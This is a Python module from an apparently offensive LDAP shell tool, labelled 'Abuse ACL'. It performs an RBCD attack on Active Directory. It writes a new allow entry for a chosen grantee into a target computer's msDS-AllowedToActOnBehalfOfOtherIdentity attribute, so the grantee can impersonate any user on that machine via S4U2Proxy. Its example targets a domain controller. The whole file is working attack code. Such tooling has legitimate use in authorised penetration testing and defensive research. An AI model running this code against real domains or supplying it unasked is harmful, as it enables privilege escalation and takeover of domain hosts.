import logging
from ldap3 import Connection
from ldapdomaindump import domainDumper
from pydantic import BaseModel, Field
from typing import Optional
from ldap_shell.prompt import Prompt
from ldap_shell.ldap_modules.base_module import BaseLdapModule, ArgumentType
import ldap3
from ldap_shell.utils.ldap_utils import LdapUtils
from ldap_shell.utils.ace_utils import AceUtils
from ldap_shell.utils.ldaptypes import SR_SECURITY_DESCRIPTOR

class LdapShellModule(BaseLdapModule):
    """Module for configuring RBCD (Resource-Based Constrained Delegation)"""
    
    help_text = "Configure RBCD permissions for a target computer"
    examples_text = """
    Example: set RBCD for target computer DC01 allowing WEB01 to delegate
    `set_rbcd DC01$ WEB01$`
    ```
    [INFO] Delegation rights modified successfully! WEB01$ can now impersonate users on DC01$ via S4U2Proxy
    ```
    `search "(sAMAccountName=WIN-AQ92SG0RJNU$)" sAMAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity`
    ```
    [INFO] Starting search operation...

    sAMAccountName                          : WIN-AQ92SG0RJNU$
    msDS-AllowedToActOnBehalfOfOtherIdentity: 010004804000000000000000000000001400000004002c000100000000002400ff010f000105000000000005150000003a81230a1ca426c690bee9becd0f000001020000000000052000000020020000
    ```
    """
    module_type = "Abuse ACL"

    class ModuleArgs(BaseModel):
        target: str = Field(
            description="Target computer account",
            arg_type=ArgumentType.COMPUTER
        )
        grantee: str = Field(
            description="Account being granted delegation rights",
            arg_type=[ArgumentType.USER, ArgumentType.COMPUTER, ArgumentType.GROUP]
        )

    def __init__(self, args_dict: dict, 
                 domain_dumper: domainDumper, 
                 client: Connection,
                 log=None):
        self.args = self.ModuleArgs(**args_dict)
        self.domain_dumper = domain_dumper
        self.client = client
        self.log = log or logging.getLogger('ldap-shell.shell')

    def __call__(self):
        # Get target information
        target_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.target)
        if not target_dn:
            self.log.error(f'Target computer not found: {self.args.target}')
            return

        # Get grantee account information
        grantee_dn = LdapUtils.get_dn(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_dn:
            self.log.error(f'Grantee account not found: {self.args.grantee}')
            return

        # Get grantee SID
        grantee_sid = LdapUtils.get_sid(self.client, self.domain_dumper, self.args.grantee)
        if not grantee_sid:
            self.log.error(f'Failed to get SID for: {self.args.grantee}')
            return

        # Get current security descriptor
        try:
            entry = self.client.search(
                target_dn,
                f'(sAMAccountName={self.args.target})',
                attributes=['msDS-AllowedToActOnBehalfOfOtherIdentity']
            )
            if not entry or len(self.client.entries) != 1:
                self.log.error('Failed to retrieve target security descriptor')
                return
            
            sd_data = self.client.entries[0]['msDS-AllowedToActOnBehalfOfOtherIdentity'].raw_values
            if sd_data:
                sd = SR_SECURITY_DESCRIPTOR(data=sd_data[0])
                self.log.info('Current allowed SIDs:')
                for ace in sd['Dacl'].aces:
                    if ace['Ace']['Sid'].formatCanonical() == grantee_sid:
                        self.log.warning('Grantee already has delegation rights')
                        return
            else:
                sd = AceUtils.create_empty_sd()

        except Exception as e:
            self.log.error(f'Error processing security descriptor: {str(e)}')
            return

        # Add new ACE
        sd['Dacl'].aces.append(AceUtils.create_allow_ace(grantee_sid))
        
        # Apply changes
        try:
            res = self.client.modify(
                target_dn,
                {'msDS-AllowedToActOnBehalfOfOtherIdentity': [(ldap3.MODIFY_REPLACE, [sd.getData()])]}
            )
        except Exception as e:
            self.log.error(f'Modification failed: {str(e)}')
            return

        if res:
            self.log.info('Delegation rights modified successfully! %s can now impersonate users on %s via S4U2Proxy',
                        self.args.grantee, self.args.target)
        else:
            self.log.error('Failed to modify delegation rights: %s', self.client.result['description'])
